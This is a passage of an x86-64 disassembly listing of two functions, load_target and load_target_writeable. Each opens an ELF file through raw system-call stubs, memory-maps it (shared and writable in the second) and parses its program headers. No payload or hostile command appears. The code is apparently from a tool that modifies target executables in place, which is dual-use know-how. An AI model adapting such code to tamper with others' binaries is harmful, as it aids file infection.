  400f4a:	e8 29 13 00 00       	call   402278 <_munmap>
  400f4f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f53:	8b 80 f8 00 00 00    	mov    eax,DWORD PTR [rax+0xf8]
  400f59:	89 c7                	mov    edi,eax
  400f5b:	e8 4c 11 00 00       	call   4020ac <_close>
  400f60:	90                   	nop
  400f61:	c9                   	leave  
  400f62:	c3                   	ret    

0000000000400f63 <load_target>:
  400f63:	f3 0f 1e fa          	endbr64 
  400f67:	55                   	push   rbp
  400f68:	48 89 e5             	mov    rbp,rsp
  400f6b:	53                   	push   rbx
  400f6c:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  400f73:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  400f7a:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  400f81:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  400f88:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  400f8f:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  400f93:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  400f9a:	ba 00 00 00 00       	mov    edx,0x0
  400f9f:	be 00 00 00 00       	mov    esi,0x0
  400fa4:	48 89 c7             	mov    rdi,rax
  400fa7:	e8 ca 10 00 00       	call   402076 <_open>
  400fac:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  400faf:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  400fb3:	79 0a                	jns    400fbf <load_target+0x5c>
  400fb5:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400fba:	e9 b1 03 00 00       	jmp    401370 <load_target+0x40d>
  400fbf:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  400fc6:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  400fc9:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  400fcf:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  400fd2:	48 98                	cdqe   
  400fd4:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  400fdb:	48 89 d6             	mov    rsi,rdx
  400fde:	48 89 c7             	mov    rdi,rax
  400fe1:	e8 50 11 00 00       	call   402136 <_fstat>
  400fe6:	85 c0                	test   eax,eax
  400fe8:	79 0a                	jns    400ff4 <load_target+0x91>
  400fea:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400fef:	e9 7c 03 00 00       	jmp    401370 <load_target+0x40d>
  400ff4:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  400ff7:	48 63 d0             	movsxd rdx,eax
  400ffa:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  400ffe:	41 b9 00 00 00 00    	mov    r9d,0x0
  401004:	49 89 d0             	mov    r8,rdx
  401007:	b9 02 00 00 00       	mov    ecx,0x2
  40100c:	ba 03 00 00 00       	mov    edx,0x3
  401011:	48 89 c6             	mov    rsi,rax
  401014:	bf 00 00 00 00       	mov    edi,0x0
  401019:	e8 f4 11 00 00       	call   402212 <_mmap>
  40101e:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  401025:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  401029:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401030:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  401034:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  401038:	75 0a                	jne    401044 <load_target+0xe1>
  40103a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40103f:	e9 2c 03 00 00       	jmp    401370 <load_target+0x40d>
  401044:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40104b:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40104f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401056:	48 89 10             	mov    QWORD PTR [rax],rdx
  401059:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401060:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401064:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40106b:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40106e:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401072:	48 01 c2             	add    rdx,rax
  401075:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40107c:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  401080:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401087:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40108b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401092:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401095:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401099:	48 01 c2             	add    rdx,rax
  40109c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010a3:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  4010a7:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  4010ae:	e9 b6 01 00 00       	jmp    401269 <load_target+0x306>
  4010b3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010ba:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4010be:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4010c1:	48 63 d0             	movsxd rdx,eax
  4010c4:	48 89 d0             	mov    rax,rdx
  4010c7:	48 c1 e0 03          	shl    rax,0x3
  4010cb:	48 29 d0             	sub    rax,rdx
  4010ce:	48 c1 e0 03          	shl    rax,0x3
  4010d2:	48 01 c8             	add    rax,rcx
  4010d5:	8b 00                	mov    eax,DWORD PTR [rax]
  4010d7:	83 f8 01             	cmp    eax,0x1
  4010da:	74 0e                	je     4010ea <load_target+0x187>
  4010dc:	83 f8 02             	cmp    eax,0x2
  4010df:	0f 84 3f 01 00 00    	je     401224 <load_target+0x2c1>
  4010e5:	e9 7b 01 00 00       	jmp    401265 <load_target+0x302>
  4010ea:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010f1:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4010f5:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4010f8:	48 63 d0             	movsxd rdx,eax
  4010fb:	48 89 d0             	mov    rax,rdx
  4010fe:	48 c1 e0 03          	shl    rax,0x3
  401102:	48 29 d0             	sub    rax,rdx
  401105:	48 c1 e0 03          	shl    rax,0x3
  401109:	48 01 c8             	add    rax,rcx
  40110c:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401110:	48 85 c0             	test   rax,rax
  401113:	0f 95 c0             	setne  al
  401116:	0f b6 c0             	movzx  eax,al
  401119:	85 c0                	test   eax,eax
  40111b:	74 0a                	je     401127 <load_target+0x1c4>
  40111d:	83 f8 01             	cmp    eax,0x1
  401120:	74 6c                	je     40118e <load_target+0x22b>
  401122:	e9 3e 01 00 00       	jmp    401265 <load_target+0x302>
  401127:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40112e:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401132:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401135:	48 63 d0             	movsxd rdx,eax
  401138:	48 89 d0             	mov    rax,rdx
  40113b:	48 c1 e0 03          	shl    rax,0x3
  40113f:	48 29 d0             	sub    rax,rdx
  401142:	48 c1 e0 03          	shl    rax,0x3
  401146:	48 01 c8             	add    rax,rcx
  401149:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  40114d:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401154:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  401158:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40115f:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401163:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401166:	48 63 d0             	movsxd rdx,eax
  401169:	48 89 d0             	mov    rax,rdx
  40116c:	48 c1 e0 03          	shl    rax,0x3
  401170:	48 29 d0             	sub    rax,rdx
  401173:	48 c1 e0 03          	shl    rax,0x3
  401177:	48 01 c8             	add    rax,rcx
  40117a:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  40117e:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401185:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  401189:	e9 94 00 00 00       	jmp    401222 <load_target+0x2bf>
  40118e:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401195:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401199:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40119c:	48 63 d0             	movsxd rdx,eax
  40119f:	48 89 d0             	mov    rax,rdx
  4011a2:	48 c1 e0 03          	shl    rax,0x3
  4011a6:	48 29 d0             	sub    rax,rdx
  4011a9:	48 c1 e0 03          	shl    rax,0x3
  4011ad:	48 01 c8             	add    rax,rcx
  4011b0:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4011b4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011bb:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  4011bf:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011c6:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011ca:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011cd:	48 63 d0             	movsxd rdx,eax
  4011d0:	48 89 d0             	mov    rax,rdx
  4011d3:	48 c1 e0 03          	shl    rax,0x3
  4011d7:	48 29 d0             	sub    rax,rdx
  4011da:	48 c1 e0 03          	shl    rax,0x3
  4011de:	48 01 c8             	add    rax,rcx
  4011e1:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4011e5:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011ec:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  4011f0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011f7:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011fb:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011fe:	48 63 d0             	movsxd rdx,eax
  401201:	48 89 d0             	mov    rax,rdx
  401204:	48 c1 e0 03          	shl    rax,0x3
  401208:	48 29 d0             	sub    rax,rdx
  40120b:	48 c1 e0 03          	shl    rax,0x3
  40120f:	48 01 c8             	add    rax,rcx
  401212:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  401216:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40121d:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401221:	90                   	nop
  401222:	eb 41                	jmp    401265 <load_target+0x302>
  401224:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40122b:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  40122f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401236:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40123a:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40123d:	48 63 d0             	movsxd rdx,eax
  401240:	48 89 d0             	mov    rax,rdx
  401243:	48 c1 e0 03          	shl    rax,0x3
  401247:	48 29 d0             	sub    rax,rdx
  40124a:	48 c1 e0 03          	shl    rax,0x3
  40124e:	48 01 f0             	add    rax,rsi
  401251:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401255:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  401259:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401260:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  401264:	90                   	nop
  401265:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  401269:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401270:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401273:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401277:	0f b7 c0             	movzx  eax,ax
  40127a:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  40127d:	0f 8c 30 fe ff ff    	jl     4010b3 <load_target+0x150>
  401283:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40128a:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  401291:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  401298:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  40129c:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  4012a0:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  4012a7:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  4012ae:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  4012b2:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  4012b9:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  4012c0:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  4012c7:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  4012ce:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  4012d5:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  4012d9:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  4012dd:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  4012e4:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  4012eb:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  4012ef:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  4012f3:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  4012fa:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  401301:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  401305:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  401309:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  401310:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  401317:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  40131b:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  40131f:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  401326:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  40132d:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  401331:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  401335:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  40133c:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  401343:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  401347:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  40134b:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  401352:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  401359:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  40135d:	48 89 c2             	mov    rdx,rax
  401360:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401367:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  40136b:	b8 00 00 00 00       	mov    eax,0x0
  401370:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  401377:	5b                   	pop    rbx
  401378:	5d                   	pop    rbp
  401379:	c3                   	ret    

000000000040137a <load_target_writeable>:
  40137a:	f3 0f 1e fa          	endbr64 
  40137e:	55                   	push   rbp
  40137f:	48 89 e5             	mov    rbp,rsp
  401382:	53                   	push   rbx
  401383:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  40138a:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  401391:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  401398:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40139f:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  4013a6:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  4013aa:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  4013b1:	ba 00 00 00 00       	mov    edx,0x0
  4013b6:	be 02 00 00 00       	mov    esi,0x2
  4013bb:	48 89 c7             	mov    rdi,rax
  4013be:	e8 b3 0c 00 00       	call   402076 <_open>
  4013c3:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  4013c6:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  4013ca:	79 0a                	jns    4013d6 <load_target_writeable+0x5c>
  4013cc:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4013d1:	e9 b1 03 00 00       	jmp    401787 <load_target_writeable+0x40d>
  4013d6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4013dd:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  4013e0:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  4013e6:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  4013e9:	48 98                	cdqe   
  4013eb:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  4013f2:	48 89 d6             	mov    rsi,rdx
  4013f5:	48 89 c7             	mov    rdi,rax
  4013f8:	e8 39 0d 00 00       	call   402136 <_fstat>
  4013fd:	85 c0                	test   eax,eax
  4013ff:	79 0a                	jns    40140b <load_target_writeable+0x91>
  401401:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401406:	e9 7c 03 00 00       	jmp    401787 <load_target_writeable+0x40d>
  40140b:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  40140e:	48 63 d0             	movsxd rdx,eax
  401411:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401415:	41 b9 00 00 00 00    	mov    r9d,0x0
  40141b:	49 89 d0             	mov    r8,rdx
  40141e:	b9 01 00 00 00       	mov    ecx,0x1
  401423:	ba 03 00 00 00       	mov    edx,0x3
  401428:	48 89 c6             	mov    rsi,rax
  40142b:	bf 00 00 00 00       	mov    edi,0x0
  401430:	e8 dd 0d 00 00       	call   402212 <_mmap>
  401435:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  40143c:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  401440:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401447:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40144b:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  40144f:	75 0a                	jne    40145b <load_target_writeable+0xe1>
  401451:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401456:	e9 2c 03 00 00       	jmp    401787 <load_target_writeable+0x40d>
  40145b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401462:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401466:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40146d:	48 89 10             	mov    QWORD PTR [rax],rdx
  401470:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401477:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40147b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401482:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401485:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401489:	48 01 c2             	add    rdx,rax
  40148c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401493:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  401497:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40149e:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014a2:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014a9:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4014ac:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4014b0:	48 01 c2             	add    rdx,rax
  4014b3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014ba:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  4014be:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  4014c5:	e9 b6 01 00 00       	jmp    401680 <load_target_writeable+0x306>
  4014ca:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014d1:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4014d5:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4014d8:	48 63 d0             	movsxd rdx,eax
  4014db:	48 89 d0             	mov    rax,rdx
  4014de:	48 c1 e0 03          	shl    rax,0x3
  4014e2:	48 29 d0             	sub    rax,rdx
  4014e5:	48 c1 e0 03          	shl    rax,0x3
  4014e9:	48 01 c8             	add    rax,rcx
  4014ec:	8b 00                	mov    eax,DWORD PTR [rax]
  4014ee:	83 f8 01             	cmp    eax,0x1
  4014f1:	74 0e                	je     401501 <load_target_writeable+0x187>
  4014f3:	83 f8 02             	cmp    eax,0x2
  4014f6:	0f 84 3f 01 00 00    	je     40163b <load_target_writeable+0x2c1>
  4014fc:	e9 7b 01 00 00       	jmp    40167c <load_target_writeable+0x302>
  401501:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401508:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40150c:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40150f:	48 63 d0             	movsxd rdx,eax
  401512:	48 89 d0             	mov    rax,rdx
  401515:	48 c1 e0 03          	shl    rax,0x3
  401519:	48 29 d0             	sub    rax,rdx
  40151c:	48 c1 e0 03          	shl    rax,0x3
  401520:	48 01 c8             	add    rax,rcx
  401523:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401527:	48 85 c0             	test   rax,rax
  40152a:	0f 95 c0             	setne  al
  40152d:	0f b6 c0             	movzx  eax,al
  401530:	85 c0                	test   eax,eax
  401532:	74 0a                	je     40153e <load_target_writeable+0x1c4>
  401534:	83 f8 01             	cmp    eax,0x1
  401537:	74 6c                	je     4015a5 <load_target_writeable+0x22b>
  401539:	e9 3e 01 00 00       	jmp    40167c <load_target_writeable+0x302>
  40153e:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401545:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401549:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40154c:	48 63 d0             	movsxd rdx,eax
  40154f:	48 89 d0             	mov    rax,rdx
  401552:	48 c1 e0 03          	shl    rax,0x3
  401556:	48 29 d0             	sub    rax,rdx
  401559:	48 c1 e0 03          	shl    rax,0x3
  40155d:	48 01 c8             	add    rax,rcx
  401560:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  401564:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40156b:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  40156f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401576:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40157a:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40157d:	48 63 d0             	movsxd rdx,eax
  401580:	48 89 d0             	mov    rax,rdx
  401583:	48 c1 e0 03          	shl    rax,0x3
  401587:	48 29 d0             	sub    rax,rdx
  40158a:	48 c1 e0 03          	shl    rax,0x3
  40158e:	48 01 c8             	add    rax,rcx
  401591:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401595:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40159c:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  4015a0:	e9 94 00 00 00       	jmp    401639 <load_target_writeable+0x2bf>
  4015a5:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015ac:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015b0:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015b3:	48 63 d0             	movsxd rdx,eax
  4015b6:	48 89 d0             	mov    rax,rdx
  4015b9:	48 c1 e0 03          	shl    rax,0x3
  4015bd:	48 29 d0             	sub    rax,rdx
  4015c0:	48 c1 e0 03          	shl    rax,0x3
  4015c4:	48 01 c8             	add    rax,rcx
  4015c7:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4015cb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015d2:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  4015d6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015dd:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015e1:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015e4:	48 63 d0             	movsxd rdx,eax
  4015e7:	48 89 d0             	mov    rax,rdx
  4015ea:	48 c1 e0 03          	shl    rax,0x3
  4015ee:	48 29 d0             	sub    rax,rdx
  4015f1:	48 c1 e0 03          	shl    rax,0x3
  4015f5:	48 01 c8             	add    rax,rcx
  4015f8:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4015fc:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401603:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  401607:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40160e:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401612:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401615:	48 63 d0             	movsxd rdx,eax
  401618:	48 89 d0             	mov    rax,rdx
  40161b:	48 c1 e0 03          	shl    rax,0x3
  40161f:	48 29 d0             	sub    rax,rdx
  401622:	48 c1 e0 03          	shl    rax,0x3
  401626:	48 01 c8             	add    rax,rcx
  401629:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  40162d:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401634:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401638:	90                   	nop
  401639:	eb 41                	jmp    40167c <load_target_writeable+0x302>
  40163b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401642:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  401646:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40164d:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  401651:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401654:	48 63 d0             	movsxd rdx,eax
  401657:	48 89 d0             	mov    rax,rdx
  40165a:	48 c1 e0 03          	shl    rax,0x3
  40165e:	48 29 d0             	sub    rax,rdx
  401661:	48 c1 e0 03          	shl    rax,0x3
  401665:	48 01 f0             	add    rax,rsi
  401668:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  40166c:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  401670:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401677:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  40167b:	90                   	nop
  40167c:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  401680:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401687:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40168a:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  40168e:	0f b7 c0             	movzx  eax,ax
  401691:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  401694:	0f 8c 30 fe ff ff    	jl     4014ca <load_target_writeable+0x150>
  40169a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
